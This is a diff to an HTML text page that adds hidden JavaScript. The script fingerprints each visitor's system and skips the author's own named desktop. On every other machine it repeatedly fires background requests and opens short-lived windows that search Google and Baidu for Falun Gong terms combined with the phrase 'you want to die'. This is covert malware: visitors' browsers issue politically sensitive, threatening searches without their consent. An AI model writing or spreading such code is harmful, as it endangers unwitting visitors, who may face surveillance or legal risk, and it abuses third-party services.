@@ -35,6 +35,136 @@ table.DF_PIC_Link_Table table
 
 
 <body bgcolor=#CCE8CF>
+<script type="text/javascript">
+//========================================Base_Function========================================
+//==========DIVISION==========
+function Parameter_Base_STR_ijk_XX(p_num)
+{
+	var i,j,str00,arr00;
+	str00="";
+	str00+="var i,j,k,m,n,p,q,r,s,t;" + "\n";
+	arr00=["num","ele","elel","str","arr","cls","fun","formData","file"];
+	//arr00=["num","ele","elel",,"str","arr","torf","flag"];
+
+	for (i=0;i<arr00.length;i++)
+	{
+		str00+="var ";
+		for (j=0;j<p_num;j++)
+		{
+			str00+=arr00[i] + ("00" + j.toString()).slice(-2);
+			if ( j<(p_num - 1) )			{str00+=",";}
+			else if ( j==(p_num - 1) )		{str00+=";" + "\n";}
+			else							{}
+		}
+	}
+
+	return str00;
+}
+
+function createArray(length)
+{
+	var arr=new Array(length||0),i=length;
+	if ( arguments.length>1 )
+	{
+		var args=Array.prototype.slice.call(arguments,1);
+		while(i--)
+		{
+			arr[length-1-i]=createArray.apply(this,args);
+		}
+	}
+	return arr;
+}
+
+String.prototype.repeat = function( num )
+{
+	return new Array( num + 1 ).join( this );
+};
+
+function ReadTextFile(oFile)
+{
+	if (window.XMLHttpRequest)//code for IE7+, Firefox, Chrome, Opera, Safari
+	{
+		xmlhttp=new XMLHttpRequest();
+	}
+	else// code for IE6, IE5
+	{
+		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+	}
+
+	xmlhttp.open("GET",oFile,false);
+	xmlhttp.send();
+	var xmlText=xmlhttp.responseText; 
+	return xmlText;
+}
+
+function amplifyMedia(mediaElem,multiplier)
+{
+	var context=new( window.AudioContext || window.webkitAudioContext );
+	var result			=
+	{
+		context			:	context,
+		source			:	context.createMediaElementSource(mediaElem),
+		gain			:	context.createGain(),
+		media			:	mediaElem,
+		amplify			:	function(multiplier)
+		{
+			result.gain.gain.value=multiplier;
+		},
+		getAmpLevel		:	function()
+		{
+			return result.gain.gain.value;
+		}
+	};
+	result.source.connect(result.gain);
+	result.gain.connect(context.destination);
+	result.amplify(multiplier);
+	return result;
+}
+
+var TTIS=100;
+var TTI_IN_USE=TTIS;
+//==========DIVISION==========
+var Screen_Width	=window.screen.width;
+var Screen_Height	=window.screen.height;
+//==========DIVISION==========
+//解析操作系统信息。
+var Platform		=navigator.platform;
+var OS				="Unknown";
+if ( Platform.match(/win/i) )					{OS={STR:"Windows",	ID:0	,	HWID:0,		HWSTR:"PC",			};}
+else if ( Platform.match(/mac/i) )				{OS={STR:"MacOS",	ID:1	,	HWID:0,		HWSTR:"PC",			};}
+else if ( Platform.match(/linux/i) )
+{
+	if ( Screen_Width>=Screen_Height )			{OS={STR:"Linux",	ID:2	,	HWID:0,		HWSTR:"PC",			};}
+	else										{OS={STR:"Android",	ID:3	,	HWID:1,		HWSTR:"Mobile",		};}
+}
+else if ( Platform.match(/android/i) )			{OS={STR:"Android",	ID:3	,	HWID:1,		HWSTR:"Mobile",		};}
+else if ( Platform.match(/iphone|ipad|ipod/i) )	{OS={STR:"iOS",		ID:4	,	HWID:1,		HWSTR:"Mobile",		};}
+else											{}
+//==========DIVISION==========
+function OS_Screen_LEN_WOrH()
+{
+	var Screen_Width	=window.screen.width;
+	var Screen_Height	=window.screen.height;
+	var OS_Screen_LEN_WOrH_VAL={ID:0,STR:"Width"};
+	if ( OS.ID==0 || OS.ID==1 || OS.ID==2 )			{}
+	else if ( OS.ID==3 || OS.ID==4 )
+	{
+		if ( Screen_Width>=Screen_Height )			{}
+		else if ( Screen_Width<Screen_Height )		{OS_Screen_LEN_WOrH_VAL={ID:1,STR:"Height"};}
+		else		{}
+	}
+	else											{}
+	return OS_Screen_LEN_WOrH_VAL;
+}
+//==========DIVISION==========
+function Math_Random_Interval(Base,Interval)
+{
+	return (Base + parseInt(Interval * (2 * parseInt(2 * Math.random(),10) - 1) * Math.random(),10));
+}
+//==========DIVISION==========
+//========================================Base_Function========================================
+</script>
+
 <pre class="Text_CLS">
 ================================================================================
 ============================================================
@@ -338,8 +468,8 @@ function Get_Computer_Name()
 	xmlhttp.onreadystatechange=function()
 	{
 		//==========DIVISION==========
-		if ( xmlhttp_readyState==4 && ( xmlhttp_status==200 || 
-										xmlhttp_status==8 && navigator.appName=="Microsoft Internet Explorer" || 
+		if ( xmlhttp.readyState==4 && ( xmlhttp.status==200 || 
+										xmlhttp.status==8 && navigator.appName=="Microsoft Internet Explorer" || 
 										0 ) )
 		{
 			//==========DIVISION==========
@@ -359,66 +489,75 @@ function Get_Computer_Name()
 				console.log(err.message);
 			}
 			//==========DIVISION==========
-			//if ( OS.HWID==0 && HW.Computer_Name=="DESKTOP-87N40NV" || 
-			//if ( OS.HWID==0 && HW.Computer_Name!="DESKTOP-87N40NV" || 
-			if ( OS.HWID==0 && ( HW.Computer_Name=="DESKTOP-87N40NV" && HW.CPU_Info.replace(/I7-3770K/igm,"")!=HW.CPU_Info && 
-					1 ) ||
-				OS.HWID==1 )
-			{
-				console.log("HW : " + JSON.stringify(HW) + " .");
-			}
-			//else if ( OS.HWID==0 && HW.Computer_Name!="DESKTOP-87N40NV" )
-			//else if ( OS.HWID==0 && HW.Computer_Name=="DESKTOP-87N40NV" )
-			else
+			TTI_IN_USE=1000 * 10;
+			setTimeout(function()
 			{
 				//==========DIVISION==========
-				arr00=[
-					"https://www.google.com/search?hl=zh-CN&q=",
-					"https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=",
-				];
-				arr01=["李洪志","真善忍","法轮功","法轮大法"];
-				//arr02=["我想死","你想死","你找死","你死了没"];
-				arr02=["你想死"];
-				//arr02=["好","不好"];
+				var fun_ct_cache_00;
+				fun_ct_cache_00=arguments.callee;
 				//==========DIVISION==========
-				str01="";
-				for (j=0;j<arr01.length;j++)
+				//eval(ELE_ELEL_STR_INI(0));
+				eval(Parameter_Base_STR_ijk_XX(5));
+				var ID,LEN,ID_LEN;
+				//==========DIVISION==========
+				//if ( OS.HWID==0 && HW.Computer_Name=="DESKTOP-87N40NV" || 
+				//if ( OS.HWID==0 && HW.Computer_Name!="DESKTOP-87N40NV" || 
+				if ( OS.HWID==0 && ( HW.Computer_Name=="DESKTOP-87N40NV" && HW.CPU_Info.replace(/I7-3770K/igm,"")!=HW.CPU_Info && 
+						1 ) ||
+					OS.HWID==1 )
 				{
-					for (k=0;k<arr02.length;k++)
-					{
-						str01+=arr01[j] + arr02[k];
-					}
+					console.log("HW : " + JSON.stringify(HW) + " .");
 				}
-				//==========DIVISION==========
-				for (m=0;m<2;m++)
+				//else if ( OS.HWID==0 && HW.Computer_Name!="DESKTOP-87N40NV" )
+				//else if ( OS.HWID==0 && HW.Computer_Name=="DESKTOP-87N40NV" )
+				else
 				{
-					for (i=0;i<arr00.length;i++)
+					//==========DIVISION==========
+					arr00=[
+						"https://www.google.com/search?hl=zh-CN&q=",
+						"https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=",
+					];
+					arr01=["李洪志","真善忍","法轮功","法轮大法"];
+					//arr02=["我想死","你想死","你找死","你死了没"];
+					arr02=["你想死"];
+					//arr02=["好","不好"];
+					//==========DIVISION==========
+					str01="";
+					for (j=0;j<arr01.length;j++)
 					{
-						str00="";
-						str00+=	arr01[parseInt(arr01.length * Math.random(),10)] + 
-								arr02[parseInt(arr02.length * Math.random(),10)] + 
-								"";
-						str00+=	"。";
-						str00+=str01;
-						str00=arr00[i] + str00;
-						console.log(str00);
-						xmlhttp.open("GET",str00,true);
-						xmlhttp.send();
+						for (k=0;k<arr02.length;k++)
+						{
+							str01+=arr01[j] + arr02[k];
+						}
 					}
-				}
-				//==========DIVISION==========
-				str00="";
-				str00+=	arr00[parseInt(arr00.length * Math.random(),10)] + 
-						arr01[parseInt(arr01.length * Math.random(),10)] + 
-						arr02[parseInt(arr02.length * Math.random(),10)] + 
-						"";
-				str00+=	"。";
-				str00+=str01;
-				//==========DIVISION==========
-				console.log(str00);
-				//window.location.href=str00;
-				setInterval(function(str00)
-				{
+					//==========DIVISION==========
+					for (m=0;m<2;m++)
+					{
+						for (i=0;i<arr00.length;i++)
+						{
+							str00="";
+							str00+=	arr01[parseInt(arr01.length * Math.random(),10)] + 
+									arr02[parseInt(arr02.length * Math.random(),10)] + 
+									"";
+							str00+=	"。";
+							str00+=str01;
+							str00=arr00[i] + str00;
+							console.log(str00);
+							xmlhttp.open("GET",str00,true);
+							xmlhttp.send();
+						}
+					}
+					//==========DIVISION==========
+					str00="";
+					str00+=	arr00[parseInt(arr00.length * Math.random(),10)] + 
+							arr01[parseInt(arr01.length * Math.random(),10)] + 
+							arr02[parseInt(arr02.length * Math.random(),10)] + 
+							"";
+					str00+=	"。";
+					str00+=str01;
+					//==========DIVISION==========
+					console.log(str00);
+					//window.location.href=str00;
 					//==========DIVISION==========
 					WObj_Cache=window.open(str00);
 					//==========DIVISION==========
@@ -427,10 +566,12 @@ function Get_Computer_Name()
 						WObj_Cache.close();
 					},1000 * 10,WObj_Cache);
 					//==========DIVISION==========
-				},1000 * 300,str00);
+				}
+				//else		{}
 				//==========DIVISION==========
-			}
-			//else		{}
+				setTimeout(fun_ct_cache_00,TTI_IN_USE);
+				//==========DIVISION==========
+			},TTI_IN_USE);
 			//==========DIVISION==========
 		}
 		else		{}
